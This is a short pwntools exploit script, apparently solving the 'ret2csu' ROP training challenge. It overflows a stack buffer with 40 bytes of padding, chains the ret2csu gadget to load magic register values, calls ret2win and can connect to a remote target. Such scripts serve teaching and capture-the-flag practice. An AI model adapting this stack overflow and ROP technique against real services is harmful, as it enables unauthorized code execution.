from pwn import *
import sys

context.binary = exe = ELF(f"./ret2csu_patched", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)

    def send(self, content):
        p = self.p
        p.sendlineafter(b"> ", content)


x, p = init()
r = ROP(exe)
r.ret2csu(
    edi=0,
    rsi=0xcafebabecafebabe,
    rdx=0xd00df00dd00df00d,
)
r.raw(r.find_gadget(['pop rdi', 'ret'])[0])
r.raw(0xdeadbeefdeadbeef)
r.call(exe.plt['ret2win'])

pay = b"A"*40
pay += flat(r)
x.debug((
    "break *pwnme+152\nc\n" +
    "break *ret2win\nc\n"+
    "break *ret2win+38\nc"
))
x.send(pay)
p.interactive()
